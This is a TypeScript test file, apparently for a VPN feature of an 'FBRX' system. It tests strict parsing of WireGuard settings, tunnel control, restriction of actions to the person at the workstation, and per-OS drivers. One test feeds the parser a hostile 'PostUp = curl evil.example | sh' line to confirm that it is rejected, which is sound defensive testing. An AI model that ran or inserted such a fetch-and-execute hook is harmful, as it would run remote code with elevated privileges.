import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parseVpnSettings, renderVpnSettings, type VpnStatus } from '@fbrx/shared';
import { peerConfig, starterConfig } from '../../gate/src/index';
import { wgKeyPair } from '../../gate/src/node/index';
import { LinuxVpnDriver, MacVpnDriver, VpnService, WindowsVpnDriver, type CommandResult, type VpnDriver } from '../src/network/vpn';
import { makeKernel, USER } from './helpers';

/** The settings file a gate makes for a device (DNS & VPN → Add a device). */
function gateSettings(o: { fullTunnel?: boolean; endpoint?: string } = {}): string {
  const c = starterConfig({ wan: 'eno1', lan: 'eno2', lanAddress: '192.168.50.1/24' });
  c.vpn.enabled = true;
  const keys = wgKeyPair();
  const peer = { name: 'laptop', publicKey: keys.publicKey, address: '10.99.0.2', keepalive: 25 };
  return peerConfig({ config: c, peer, privateKey: keys.privateKey, gatePublicKey: wgKeyPair().publicKey, endpoint: o.endpoint ?? 'home.example.net', fullTunnel: o.fullTunnel ?? false });
}

/** Commands a stand-in system answers, and what was asked. */
function system(answer: (cmd: string, args: string[]) => Partial<CommandResult> | undefined) {
  const calls: string[][] = [];
  const run = async (cmd: string, args: string[]) => {
    calls.push([cmd, ...args]);
    return { code: 0, out: '', err: '', ...(answer(cmd, args) ?? {}) };
  };
  return { calls, run };
}

describe('FBRX VPN reads a gate’s device settings strictly', () => {
  it('takes what the gate makes, and rebuilds a clean file from it', () => {
    const s = parseVpnSettings(gateSettings());
    expect(s).toMatchObject({ address: '10.99.0.2/32', dns: '10.99.0.1', peer: { endpoint: 'home.example.net:51820', allowedIps: ['10.99.0.0/24', '192.168.50.0/24'], keepalive: 25 } });
    expect(renderVpnSettings(s, { dns: true })).toContain('DNS = 10.99.0.1');
    expect(renderVpnSettings(s, { dns: false })).not.toContain('DNS');
    expect(parseVpnSettings(gateSettings({ fullTunnel: true })).peer.allowedIps).toEqual(['0.0.0.0/0']);
  });

  it('refuses commands, missing keys and a gate that did not know its address', () => {
    const good = gateSettings();
    expect(() => parseVpnSettings(good.replace('[Interface]', '[Interface]\nPostUp = curl evil.example | sh'))).toThrow(/run a command \(PostUp\)/);
    expect(() => parseVpnSettings(good.replace(/PrivateKey = .*/, 'PrivateKey = nope'))).toThrow(/no private key/);
    expect(() => parseVpnSettings(good.replace('[Interface]', '[Interface]\nTable = off'))).toThrow(/does not use the setting table/);
    expect(() => parseVpnSettings(gateSettings({ endpoint: 'YOUR-PUBLIC-ADDRESS' }))).toThrow(/did not know its internet address/);
    expect(() => parseVpnSettings('hello')).toThrow(/Not a VPN settings file/);
  });
});

describe('FBRX VPN on a computer', () => {
  /** A driver that keeps its tunnel in memory, and the files it was given. */
  function fakeDriver(): VpnDriver & { files: string[]; tunnel: boolean } {
    const d = {
      files: [] as string[],
      tunnel: false,
      keepsFile: false,
      ready: async () => ({ ready: true, why: null, canInstall: false }),
      install: async () => undefined,
      dns: async () => false,
      up: async (file: string) => {
        d.files.push(readFileSync(file, 'utf8'));
        d.tunnel = true;
      },
      down: async () => {
        d.tunnel = false;
      },
      state: async () => ({ up: d.tunnel, received: d.tunnel ? 1234 : null, sent: d.tunnel ? 99 : null }),
    };
    return d;
  }

  it('keeps the settings sealed, starts and stops the tunnel, and finds home behind it', async () => {
    const { kernel, cleanup, dataDir } = await makeKernel();
    try {
      const driver = fakeDriver();
      const pinged: string[] = [];
      const vpn = new VpnService({
        db: kernel.db,
        meta: kernel.meta,
        vault: kernel.vault,
        events: kernel.events,
        dir: join(dataDir, 'tmp', 'vpn'),
        driver,
        ping: async (host) => (pinged.push(host), { ok: host !== '192.168.50.9', ms: 12 }),
        computers: async () => [
          { id: 'srv', name: 'FBRX-Server', addresses: ['192.168.50.2', '10.30.0.2'], roles: ['virtual', 'ai', 'gate'] },
          { id: 'tv', name: 'Living room', addresses: ['192.168.50.9'], roles: [] },
          { id: 'cafe', name: 'Elsewhere', addresses: ['172.31.9.9'], roles: [] },
        ],
        meshAnswers: async (id) => id === 'srv',
      });
      const p = vpn.add({ name: 'Home', settings: gateSettings() });
      expect(p).toMatchObject({ name: 'Home', endpoint: 'home.example.net:51820', address: '10.99.0.2/32', gateAddress: '10.99.0.1', fullTunnel: false });
      expect(JSON.stringify(vpn.list())).not.toContain('PrivateKey');
      const row = kernel.db.get<{ data_enc: string }>('SELECT data_enc FROM vpn_profiles WHERE id = ?', p.id)!;
      expect(row.data_enc).not.toContain('10.99.0.2');

      const on: VpnStatus = await vpn.connect(p.id);
      expect(on).toMatchObject({ state: 'on', connected: p.id, received: 1234, sent: 99 });
      // The driver got a clean file (no name server: this system cannot set one), which is gone again.
      expect(driver.files[0]).toMatch(/^\[Interface\]\nPrivateKey = /);
      expect(driver.files[0]).not.toContain('DNS');
      expect(existsSync(join(dataDir, 'tmp', 'vpn', 'fbrxvpn.conf'))).toBe(false);

      const check = await vpn.check();
      expect(check.gate).toEqual({ address: '10.99.0.1', ok: true, ms: 12 });
      expect(check.computers).toEqual([
        { id: 'srv', name: 'FBRX-Server', address: '192.168.50.2', ok: true, ms: 12, mesh: true, roles: ['virtual', 'ai', 'gate'] },
        { id: 'tv', name: 'Living room', address: '192.168.50.9', ok: false, ms: 12, mesh: false, roles: [] },
      ]);
      expect(pinged).not.toContain('172.31.9.9');

      // The tunnel stopped elsewhere (a restart): FBRX notices.
      driver.tunnel = false;
      expect(await vpn.status()).toMatchObject({ state: 'off', connected: null });
      await vpn.connect(p.id);
      expect((await vpn.disconnect()).state).toBe('off');
      expect(await vpn.remove(p.id)).toBe(true);
      expect(vpn.list()).toEqual([]);
    } finally {
      await cleanup();
    }
  });

  it('is only for the person at the computer', async () => {
    const { kernel, cleanup } = await makeKernel();
    try {
      await expect(kernel.call('vpn.add', { name: 'x', settings: gateSettings() }, { origin: 'api', actor: 'script' })).rejects.toThrow(/person at this workstation/);
      const p = (await kernel.call('vpn.add', { name: 'Home', settings: gateSettings() }, USER)) as { id: string };
      await expect(kernel.call('vpn.connect', { id: p.id }, { origin: 'agent', actor: 'agent' })).rejects.toThrow(/person at this workstation/);
    } finally {
      await cleanup();
    }
  });
});

describe('FBRX VPN’s drivers', () => {
  it('Linux: wg-quick through the administrator prompt, and the tunnel’s counters from ip', async () => {
    const sys = system((cmd, args) => {
      if (cmd === 'sh') return /wg-quick|pkexec|resolvconf/.test(args[1]!) ? { out: `/usr/bin/${args[1]!.split(' ').at(-1)}\n` } : { code: 1 };
      if (cmd === 'ip') return { out: JSON.stringify([{ ifname: 'fbrxvpn', stats64: { rx: { bytes: 5000 }, tx: { bytes: 700 } } }]) };
      return undefined;
    });
    const d = new LinuxVpnDriver({ run: sys.run, root: false });
    expect(await d.ready()).toEqual({ ready: true, why: null, canInstall: false });
    await d.up('/data/tmp/vpn/fbrxvpn.conf');
    expect(sys.calls.find((c) => c[0] === 'pkexec')).toEqual(['pkexec', '/usr/bin/wg-quick', 'up', '/data/tmp/vpn/fbrxvpn.conf']);
    expect(await d.state()).toEqual({ up: true, received: 5000, sent: 700 });
    expect(await d.dns()).toBe(true);

    const missing = new LinuxVpnDriver({ run: system((cmd, args) => (cmd === 'sh' ? (/apt-get|pkexec/.test(args[1]!) ? { out: '/usr/bin/x\n' } : { code: 1 }) : undefined)).run, root: false });
    expect(await missing.ready()).toMatchObject({ ready: false, why: expect.stringContaining('wireguard-tools'), canInstall: true });
    const declined = new LinuxVpnDriver({ run: system((cmd) => (cmd === 'pkexec' ? { code: 126 } : cmd === 'sh' ? { out: '/usr/bin/wg-quick\n' } : undefined)).run, root: false });
    await expect(declined.up('/x.conf')).rejects.toMatchObject({ code: 'CANCELLED' });
  });

  it('macOS: wg-quick from Homebrew with the administrator prompt, quoted safely', async () => {
    const sys = system(() => undefined);
    const d = new MacVpnDriver({ run: sys.run, exists: (p) => p === '/opt/homebrew/bin/wg-quick' || p === '/var/run/wireguard/fbrxvpn.name' });
    expect((await d.ready()).ready).toBe(true);
    await d.up("/Users/sam/Library/Application Support/FBRX OS/tmp/vpn/fbrxvpn.conf");
    const script = sys.calls[0]![2]!;
    expect(sys.calls[0]!.slice(0, 2)).toEqual(['osascript', '-e']);
    expect(script).toContain(`wg-quick up '/Users/sam/Library/Application Support/FBRX OS/tmp/vpn/fbrxvpn.conf'`);
    expect(script).toMatch(/with administrator privileges$/);
    expect((await d.state()).up).toBe(true);
    const cancelled = new MacVpnDriver({ run: system(() => ({ code: 1, err: 'execution error: User canceled. (-128)' })).run, exists: () => true });
    await expect(cancelled.up('/x.conf')).rejects.toMatchObject({ code: 'CANCELLED' });
  });

  it('Windows: the tunnel service, installed and removed as administrator', async () => {
    const scripts: string[] = [];
    const sys = system((cmd) => (cmd === 'sc.exe' ? { out: 'SERVICE_NAME: WireGuardTunnel$fbrxvpn\n        STATE              : 4  RUNNING\n' } : undefined));
    const d = new WindowsVpnDriver({ run: sys.run, elevate: async (s) => (scripts.push(s), { ok: true, output: '' }), exists: () => true, programFiles: 'C:\\Program Files' });
    await d.up("C:\\Users\\O'Neil\\AppData\\Roaming\\FBRX OS\\tmp\\vpn\\fbrxvpn.conf");
    expect(scripts[0]).toContain('/installtunnelservice');
    expect(scripts[0]).toContain("'C:\\Users\\O''Neil\\AppData\\Roaming\\FBRX OS\\tmp\\vpn\\fbrxvpn.conf'");
    await d.down();
    expect(scripts[1]).toMatch(/\/uninstalltunnelservice fbrxvpn$/);
    expect((await d.state()).up).toBe(true);
    expect(d.keepsFile).toBe(true);
  });
});
